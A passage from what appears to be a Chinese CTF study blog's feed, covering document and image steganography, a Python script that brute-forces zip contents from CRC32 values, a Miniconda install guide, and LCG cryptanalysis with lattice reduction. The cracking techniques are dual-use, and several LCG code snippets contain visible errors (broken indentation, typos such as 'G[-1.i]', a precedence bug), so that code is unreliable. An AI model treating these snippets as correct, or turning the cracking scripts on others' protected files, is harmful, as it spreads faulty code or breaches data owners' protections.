    <content type="html"><![CDATA[<h1 id="word文档"><a href="#word文档" class="headerlink" title="word文档"></a>word文档</h1><h2 id="1-字体颜色"><a href="#1-字体颜色" class="headerlink" title="1.字体颜色"></a>1.字体颜色</h2><p>word文档中，字体颜色被调为白色，全选可以看到是否有隐藏文字，然后改变字体颜色即可看到隐藏文字。</p><h2 id="2-隐藏文字"><a href="#2-隐藏文字" class="headerlink" title="2.隐藏文字"></a>2.隐藏文字</h2><p>在字体设置中能够选择隐藏文字。<br><img src="/2025/04/10/MISC%E5%9F%BA%E7%A1%80%E7%AF%87-%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99/file-20250506115019989.png"><br>查看方式：<br>在<code>文件-更多-选项-显示</code>中开启显示隐藏文字<br><img src="/2025/04/10/MISC%E5%9F%BA%E7%A1%80%E7%AF%87-%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99/file-20250506115221585.png"></p><h2 id="3-隐藏图片"><a href="#3-隐藏图片" class="headerlink" title="3.隐藏图片"></a>3.隐藏图片</h2><p>在<code>选项-高级-显示文档内容中</code>，关闭图中选项，便能隐藏图片和文本框。<br><img src="/2025/04/10/MISC%E5%9F%BA%E7%A1%80%E7%AF%87-%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99/file-20250506115628388.png"></p><h2 id="4-零宽度字符隐写"><a href="#4-零宽度字符隐写" class="headerlink" title="4.零宽度字符隐写"></a>4.零宽度字符隐写</h2><p>见我另一篇文章：<a href="https://ramoor.github.io/2025/02/28/Misc%E9%9A%8F%E7%AC%94/">Misc随笔 - Ramoor</a></p><h2 id="5-pdf文档隐写"><a href="#5-pdf文档隐写" class="headerlink" title="5.pdf文档隐写"></a>5.pdf文档隐写</h2><p><strong>下载地址：</strong> <a href="https://www.bailer.at/wbstego/">wbStego Steganography Tool</a><br><strong>隐写文件：</strong> 除PDF文件之外，还有BMP、TXT、HTML文件</p><blockquote><p>可以设置密码，若无密码则保持为空</p></blockquote><p><strong>注意：</strong> 若出现如下报错<br><img src="/2025/04/10/MISC%E5%9F%BA%E7%A1%80%E7%AF%87-%E6%96%87%E6%A1%A3%E9%9A%90%E5%86%99/file-20250514214338312.png"><br>大概率是文件被另一个程序打开了。</p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>misc</tag>
      
      <tag>文档隐写</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MISC基础篇-压缩包</title>
    <link href="/2025/04/10/MISC%E5%9F%BA%E7%A1%80%E7%AF%87-%E5%8E%8B%E7%BC%A9%E5%8C%85/"/>
    <url>/2025/04/10/MISC%E5%9F%BA%E7%A1%80%E7%AF%87-%E5%8E%8B%E7%BC%A9%E5%8C%85/</url>
    
    <content type="html"><![CDATA[<h2 id="随笔-更新中…"><a href="#随笔-更新中…" class="headerlink" title="随笔(更新中…)"></a>随笔(更新中…)</h2><ul><li>zip伪加密</li><li>密码爆破，推荐使用<code>ArchPR</code>工具</li><li>解压缩工具打开，看到隐藏信息</li><li>加密压缩包内并不是所有文件都加密，也并不是加密的密码都一样。</li><li>CRC32攻击</li></ul><h2 id="CRC32攻击"><a href="#CRC32攻击" class="headerlink" title="CRC32攻击"></a>CRC32攻击</h2><p><strong>CRC32：</strong> CRC是<strong>冗余校验码</strong>。CRC32是一个32bit的校验值，计算这个值时源数据块的每一个bit都参与计算。</p><p><strong>zip文件中的CRC32攻击：</strong> 由于zip文件中保留了原始文件的CRC32校验码，因此，倘若源文件数据较小，我们便可以通过爆破明文内容的方式来破解zip文件。</p><p><strong>特点：</strong> 适合攻击密钥较长、内容较少的情况</p><p><strong>代码实现示例：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zipfile<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> string<br><br>z = zipfile.ZipFile(<span class="hljs-string">&#x27;flag.zip&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)<br><br><span class="hljs-comment"># 获取文件列表</span><br>file_list = z.namelist()<br><span class="hljs-built_in">print</span>(file_list)<br><br><span class="hljs-comment"># 获取源文件的CRC32校验码</span><br>CRC=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> file_list:<br>    CRC.append(z.getinfo(i).CRC)<br><span class="hljs-built_in">print</span>(CRC)<br><br><span class="hljs-comment"># 爆破计算CRC32，这里以多个1字节源文件的题目为例</span><br>key = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> crc <span class="hljs-keyword">in</span> CRC:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> string.printable:<br>        <span class="hljs-keyword">if</span> binascii.crc32(i.encode()) == crc:<br>            key += i<br>            <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(key)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>misc</tag>
      
      <tag>压缩包</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MISC基础篇-图片隐写</title>
    <link href="/2025/04/10/MISC%E5%9F%BA%E7%A1%80%E7%AF%87-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/"/>
    <url>/2025/04/10/MISC%E5%9F%BA%E7%A1%80%E7%AF%87-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文主要对misc中图片隐写中的<strong>常考点</strong>以及经典<strong>解题思路</strong>进行总结。</p><h2 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h2><ul><li>文件类型判断</li><li>exif隐写</li><li>文件提取</li><li>图片宽高</li><li>JPEG隐写</li><li>PNG隐写</li><li>LSB隐写</li><li>盲水印</li><li>GIF隐写</li></ul><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="1-文件类型判断"><a href="#1-文件类型判断" class="headerlink" title="1.文件类型判断"></a>1.文件类型判断</h3><ul><li><strong>010editor</strong> 分析文件头尾（可再另一篇博客查看文件头总结）</li><li><strong>Linux</strong>中使用<code>file xxx</code>命令查看文件类型</li><li><strong>Windows</strong>中使用<code>TrlDNET</code>工具查看文件类型</li></ul><h2 id="2-exif隐写"><a href="#2-exif隐写" class="headerlink" title="2.exif隐写"></a>2.exif隐写</h2><ul><li>右键属性查看（信息有限）</li><li><strong>exiftool</strong>查看：<code>exiftool xxx(文件名)</code></li></ul><h2 id="3-文件提取"><a href="#3-文件提取" class="headerlink" title="3.文件提取"></a>3.文件提取</h2><h3 id="找到隐藏文件"><a href="#找到隐藏文件" class="headerlink" title="找到隐藏文件"></a>找到隐藏文件</h3><ul><li><strong>010Editor：</strong> 如果熟悉各种文件类型特点，可直接查看<strong>字符串</strong>来查找隐藏文件。</li><li><strong>压缩工具：</strong> 直接用如 <strong>Bandzip、7Z</strong>等打开图片，可直接查看隐藏文件。</li><li><strong>Binwalk：</strong> 使用<code>binwalk xxx</code>直接查看隐藏文件</li></ul><h3 id="分离隐藏文件"><a href="#分离隐藏文件" class="headerlink" title="分离隐藏文件"></a>分离隐藏文件</h3><ul><li><strong>复制数据：</strong> 如果在010Editor或其他地方找到隐藏文件，并确定了头、尾，可以通过保存数据为新文件来分离出隐藏文件。</li><li><strong>解压工具：</strong> 解压工具能够直接解压缩图片中的隐藏文件。</li><li><strong>Foremost：</strong> 使用<code>foremost xxx</code>来分离隐藏文件，不太推荐使用<code>binwalk -e xxx</code>，本人实际应用中会遇见foremost分离出文件而binwalk分离不出的情况。</li></ul><h2 id="4-修改图片宽高"><a href="#4-修改图片宽高" class="headerlink" title="4.修改图片宽高"></a>4.修改图片宽高</h2><h3 id="PNG图片"><a href="#PNG图片" class="headerlink" title="PNG图片"></a>PNG图片</h3><p>宽：<code>0010h ~ 0013h</code><br>高：<code>0014h ~ 0017h</code><br>CRC（循环冗余检测）：<code>001dh ~ 0020h</code><br>可通过爆破CRC来恢复原图片宽高，脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#图片CRC校验</span><br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> struct<br><br>crc32_hex = <span class="hljs-number">0x2044BBCE</span> <span class="hljs-comment">#图片CRC值</span><br><br>filename = <span class="hljs-string">&#x27;xxx.png&#x27;</span> <span class="hljs-comment">##图片路径</span><br>crcbp = <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&quot;rb&quot;</span>).read()<br>  <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2000</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2000</span>):<br>        data = crcbp[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>] + \<br>            struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>, i) + struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>, j) + crcbp[<span class="hljs-number">24</span>:<span class="hljs-number">29</span>]<br>        crc32 = binascii.crc32(data) &amp; <span class="hljs-number">0xffffffff</span><br>        <span class="hljs-keyword">if</span>(crc32 == crc32_hex):<br>            <span class="hljs-built_in">print</span>(i, j)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;wid:&#x27;</span>, <span class="hljs-built_in">hex</span>(i))<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;hight:&#x27;</span>, <span class="hljs-built_in">hex</span>(j))<br></code></pre></td></tr></table></figure><h2 id="JPG图片"><a href="#JPG图片" class="headerlink" title="JPG图片"></a>JPG图片</h2><p>高：在<code>FF CO/C2</code>数据之后的 <strong>第4、第5个</strong>字节。<br>宽：在<strong>高之后</strong>的两个字节。<br><img src="/2025/04/10/MISC%E5%9F%BA%E7%A1%80%E7%AF%87-%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99/file-20250410173839147.png"></p><blockquote><p>如图各个块：<br><code>1:</code>起始头<br><code>2:</code>数据长度<br><code>3:</code>数据精度<br><code>4:</code>高<br><code>5:</code>宽</p></blockquote><h3 id="BMP图片"><a href="#BMP图片" class="headerlink" title="BMP图片"></a>BMP图片</h3><p>宽：<code>0012h ~ 0015h</code><br>高：<code>0016h ~ 0019h</code></p><h2 id="JPEG隐写"><a href="#JPEG隐写" class="headerlink" title="JPEG隐写"></a>JPEG隐写</h2><p>jsteg、JPHS（JPHide &amp; JPSeek）、outguess 01.3b、steghide 0.4、stegbreak、camouflage、appendx和wbirch。</p><h3 id="1-JPHS（JPHide-JPSeek）"><a href="#1-JPHS（JPHide-JPSeek）" class="headerlink" title="1.JPHS（JPHide &amp; JPSeek）"></a>1.JPHS（JPHide &amp; JPSeek）</h3><p><strong>工具：</strong> jphswin<br><strong>原理：</strong><br>将隐藏信息嵌入到图片的DCT系数的LSB中。<br><strong>操作：</strong><br><code>JPHide:</code>用于隐藏信息。<br><code>JPSeek:</code>用于提取JPHide隐藏的信息。</p><h2 id="PNG隐写"><a href="#PNG隐写" class="headerlink" title="PNG隐写"></a>PNG隐写</h2><h3 id="1-字符串"><a href="#1-字符串" class="headerlink" title="1.字符串"></a>1.字符串</h3><p><strong>工具：</strong> <code>010editor</code><br><strong>思路：</strong> 查看图片的固定模块是否正确，如开头，结尾，IDAT，CRC<br><strong>可能的情况：</strong></p><ul><li>IDAT改写，导致图片显示不完整</li><li>每个CRC中隐藏可打印字符</li><li>图片结尾隐藏字符串</li><li>隐藏文件（可能经过修改，自动工具无法检测，需手动查看并恢复）</li></ul><h3 id="2-zsteg"><a href="#2-zsteg" class="headerlink" title="2.zsteg"></a>2.zsteg</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">zsteg xxx.png --all<br></code></pre></td></tr></table></figure><h3 id="3-APNG动态图"><a href="#3-APNG动态图" class="headerlink" title="3.APNG动态图"></a>3.APNG动态图</h3><p>是PNG的动态扩展，结合了PNG和GIF的优势。<br><strong>工具：</strong> <a href="https://apngdis.sourceforge.net/">apngdis_gui</a><br><strong>功能：</strong> 将APNG动图分解成多张图片。</p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>misc</tag>
      
      <tag>隐写</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MIniconda安装记录</title>
    <link href="/2025/04/08/Miniconda%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/"/>
    <url>/2025/04/08/Miniconda%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p>最近做题的时候经常遇见Python不同版本中库的冲突调整，<br>这里记录一下miniconda的安装过程。</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>Miniconda是一款轻量级的只包含python和conda的软件包管理系统，适合需要灵活管理包和环境的用户。<br>它能够快速的在不同的python版本之间切换。</p><h2 id="安装环境"><a href="#安装环境" class="headerlink" title="安装环境"></a>安装环境</h2><p>我这里只记录我本人安装的环境</p><ul><li>Kali Linux</li><li>x86_64架构</li></ul><h2 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h2><ul><li>下载安装脚本</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh -O miniconda.sh<br></code></pre></td></tr></table></figure><ul><li>运行脚本</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash miniconda.sh<br></code></pre></td></tr></table></figure><p><code>Enter</code>查看协议，一直<code>Enter</code>下翻，之后输入<code>yes</code>接收协议。<br>下一步<code>Enter</code>接收默认安装路径<code>~/miniconda3</code>，也可以自己输入自定义路径。<br>下一步询问初始化，输入<code>yes</code>，同意初始化。</p><ul><li>重启电脑</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">reboot<br></code></pre></td></tr></table></figure><ul><li>验证安装是否成功</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">conda --version<br></code></pre></td></tr></table></figure><p>显示版本信息即为安装成功。</p><h2 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h2><ul><li>创建新环境</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">conda create -n myenv python=3.9 -y<br></code></pre></td></tr></table></figure><p><code>myenv:</code>自定义名称<br><code>python=3.9:</code>自定义版本</p><ul><li>开启环境</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">conda activate myenv<br></code></pre></td></tr></table></figure><ul><li>包相关</li></ul><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-comment">#numpy为例</span><br>conda <span class="hljs-keyword">install</span> numpy<br>conda update numpy<br>conda <span class="hljs-keyword">remove</span> numpy<br></code></pre></td></tr></table></figure><ul><li>退出环境</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">conda deactivate<br></code></pre></td></tr></table></figure><ul><li>查看已有环境</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">conda <span class="hljs-built_in">env</span> list<br></code></pre></td></tr></table></figure><ul><li>查看每个环境大小</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">du</span> -sh /root/miniconda3/envs/*<br></code></pre></td></tr></table></figure><ul><li>删除环境</li></ul><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua">conda <span class="hljs-built_in">remove</span> -n myenv <span class="hljs-comment">--all</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>conda</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Crypto基础篇-LCG</title>
    <link href="/2025/04/08/Crypto%E5%9F%BA%E7%A1%80%E7%AF%87-LCG/"/>
    <url>/2025/04/08/Crypto%E5%9F%BA%E7%A1%80%E7%AF%87-LCG/</url>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><strong>LCG：</strong> 即线性同余生成器，形式为$X_{n+1}\equiv aX_n+b\mod m$<br>该问题总结来说的常见考点：</p><ul><li>求$X_0(seed)$</li><li>求$b$</li><li>求$a$</li><li>求$m$</li><li>非连续</li><li>$X_n$高位泄露<br>我们接下来逐个分析求解，</li></ul><h2 id="求-X-0-seed"><a href="#求-X-0-seed" class="headerlink" title="求$X_0(seed)$"></a>求$X_0(seed)$</h2><p><strong>条件：</strong> 已知$a,b,m,X_n$<br><strong>分析：</strong><br>$\because X_{n}\equiv aX_{n-1}+b \mod m$<br>$\therefore aX_{n-1}\equiv X_n-b\mod m$<br>$\therefore X_{n-1}\equiv a^{-1}(X_n-b) \mod m$<br>依次类推，便可以求得$X_0$<br><strong>代码实现：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>a=<br>b=<br>m=<br>X_n=<br><br>inv_a=inverse(a,m)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>X_n=inv_a*(X_n-b) %m<br>seed=X_n<br><span class="hljs-built_in">print</span>(seed)<br></code></pre></td></tr></table></figure><h2 id="求b"><a href="#求b" class="headerlink" title="求b"></a>求b</h2><p><strong>条件：</strong> 已知$a,m,X_n,X_{n+1}$<br><strong>分析：</strong><br>$\because X_{n+1}\equiv aX_n+b \mod m$<br>$\therefore b\equiv X_{n+1}-aX_n \mod m$<br><strong>代码实现：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>a=<br>m=<br>X_n=<br>X_n_plus=<br><br>b=X_n_plus-a*X_n %m<br><span class="hljs-built_in">print</span>(b)<br></code></pre></td></tr></table></figure><h2 id="求a"><a href="#求a" class="headerlink" title="求a"></a>求a</h2><p><strong>条件：</strong> 已知$m,X_n,X_{n+1},X_{n+2}$<br><strong>分析：</strong><br>$\because已知$<br>$X_{n+2}\equiv aX_{n+1}+b \mod m$<br>$X_{n+1}\equiv aX_n+b \mod m$<br>$\therefore X_{n+2}-X_{n+1}\equiv a(X_{n+1}-X_n) \mod m$<br>$\therefore a\equiv(X_{n+1}-X_n)^{-1}(X_{n+2}-X_{n+1})\mod m$<br><strong>代码实现：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>m=<br>X_n=<br>X_np1=<br>X_np2=<br><br>a=inverse(X_np1-X_n,m)*(X_np2-X_np1) %m<br><span class="hljs-built_in">print</span>(a)<br></code></pre></td></tr></table></figure><h2 id="求m"><a href="#求m" class="headerlink" title="求m"></a>求m</h2><p><strong>条件：</strong> 已知至少两组四个连续的序列值，即最少五个连续值$X_{n-1},X_n,X_{n+1},X_{n+2},X_{n+3}$<br><strong>分析：</strong><br>$\because X_n\equiv aX_{n-1}+b \mod m$<br>令$t_n&#x3D;X_{n+1}-X_n$<br>则$t_{n-1}&#x3D;X_n-X_{n-1}$<br>易得$t_n\equiv at_{n-1} \mod m$<br>同理$t_{n+1}\equiv at_n \mod m$<br>相除消去$a$，再移项得$t_{n+1}t_{n-1}\equiv t_n^2 \mod m$<br>$\therefore t_{n+1}t_{n-1} - t_n^2 &#x3D; k_1m$<br>同理有$t_{n+2}t_{n} - t_{n+1}^2 &#x3D; k_2m$<br>$\therefore m&#x3D;gcd(t_{n+1}t_{n-1} - t_n^2,t_{n+2}t_{n} - t_{n+1}^2 )$</p><p><strong>代码实现：</strong><br>由于实际情况中公因数可能会带有小因子，因此若序列足够多可多试几组。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br>X_seq=[]<br><br>t=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(X_seq)-<span class="hljs-number">1</span>):<br>t.append(X_seq[i+<span class="hljs-number">1</span>]-X_seq[i])<br><br>T=[]  <span class="hljs-comment">#T_i=T_ip2 * T_i - T_ip1**2 </span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(t)-<span class="hljs-number">2</span>):<br>T.append(t[i+<span class="hljs-number">2</span>]*t[i]-t[i+<span class="hljs-number">1</span>]**<span class="hljs-number">2</span>)<br><br>m=GCD(T[<span class="hljs-number">0</span>],T[<span class="hljs-number">1</span>]) <span class="hljs-comment">#m的候选值</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,<span class="hljs-built_in">len</span>(T)):<br>    m=GCD(m,T[i])<br><br><span class="hljs-built_in">print</span>(m)<br></code></pre></td></tr></table></figure><h2 id="非连续"><a href="#非连续" class="headerlink" title="非连续"></a>非连续</h2><p><strong>条件：</strong> 已知$X_n,X_{n+2}$等序列<br><strong>分析：</strong><br>$\because X_{n+2}\equiv a(aX_n+b)+b \mod m$<br>$\therefore X_{n+2} \equiv a^2X_n+(a+1)b \mod m$<br>令$a_1&#x3D;a^2,b_1&#x3D;(a+1)b$<br>$\therefore X_{n+2}\equiv a_1X_n+b_1 \mod m$<br>之后按正常LCG步骤便可以解答即可</p><h2 id="X-n-高位-低位泄露"><a href="#X-n-高位-低位泄露" class="headerlink" title="$X_n$高位&#x2F;低位泄露"></a>$X_n$高位&#x2F;低位泄露</h2><p><strong>条件：</strong> 已知$X_n$高位$H_1,H_2,…,H_n（与原bit位相同的高位）,a,b,m$，求$L_1$<br><strong>分析：</strong><br>$\because H_2+L_2\equiv a(H_1+L_1)+b \mod m$<br>$\therefore L_2\equiv aL_1+(aH_1-H_2+b) \mod m$<br>$\therefore L_3\equiv a^2L_1+(a(aH_1-H_2+b)-H_3+b) \mod m$<br>令$A_i&#x3D;a^i\mod m,B_i&#x3D;aB_{i-1}-H_{i+1}+aH_i+b\mod m$，其中$B_1&#x3D;(aH_1-H_2+b)\mod m$<br>因此，得到<br>$L_{i+1}\equiv A_iL_1+B_i \mod m$<br>下一步，构造格</p><span>$$(k_1,k_2,...,k_n,L_1,1)\begin{pmatrix}m & 0 & \cdots & 0 & 0 & 0 \\0 & m & \cdots & 0 & 0 & 0 \\\vdots & \vdots & \ddots & \vdots & \vdots & \vdots \\0 & 0 & \cdots & m & 0 & 0 \\A_1 & A_2 & \cdots & A_n & 1 & 0 \\B_1 & B_2 & \cdots & B_n & 0 & K \end{pmatrix} \\=(L_2,L_3,...,L_{n+1},L_1,K)$$</span><p>求出$L_1$之后便可以反向求出$seed$，这里的$K$与$L$的bit位相同。</p><blockquote><p>到这里你可能也已经发现了，已知$X_n$的<strong>高位</strong>或者<strong>低位</strong>，其求法本质是一样的，因为在我们的分析中$H$和$L$几乎是完全等效的。</p></blockquote><p><strong>代码实现：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>a=<br>b=<br>m=<br>h=[]<br>kbits=<br><br>H=[<span class="hljs-number">0</span>]+h<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> H:<br>i &lt;&lt;= kbits<br><br>A=[<span class="hljs-number">1</span>]<br>B=[<span class="hljs-number">0</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(h)-<span class="hljs-number">1</span>):  <br>A.append(a*A[i-<span class="hljs-number">1</span>] % m)  <br>B.append((a*B[i-<span class="hljs-number">1</span>]+a*h[i]+b-h[i+<span class="hljs-number">1</span>]) % m)  <br>  <br>A = A[<span class="hljs-number">1</span>:]  <br>B = B[<span class="hljs-number">1</span>:]<br><br>G = Matrix(ZZ,<span class="hljs-built_in">len</span>(H),<span class="hljs-built_in">len</span>(H))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>[A]):<br>G[i,i] = m<br>G[-<span class="hljs-number">2</span>,i] = A[i]<br>G[-<span class="hljs-number">1.</span>i] = B[i]<br><br>G[-<span class="hljs-number">2</span>,-<span class="hljs-number">2</span>] = <span class="hljs-number">1</span><br>G[-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>] = <span class="hljs-number">2</span>^kbits<br>L=G.LLL()[<span class="hljs-number">0</span>]<br>L1=L[-<span class="hljs-number">2</span>]<br><span class="hljs-built_in">print</span>(L1)<br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>LCG也是让新手头疼的一部分，希望你看完我的文章之后能有新的收获，如果有问题的话欢迎指出，本人作为一名ctfer菜鸟，难免会有些小错误哒(๑´ڡ ‘๑)&#x2F;。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://dexterjie.github.io/2024/07/16/%E6%B5%81%E5%AF%86%E7%A0%81/%E6%B5%81%E5%AF%86%E7%A0%81-LCG/?highlight=lcg">LCG | DexterJie’Blog</a></p>]]></content>
    
    
    <categories>
      
      <category>Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>LCG</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RSA题型汇总</title>
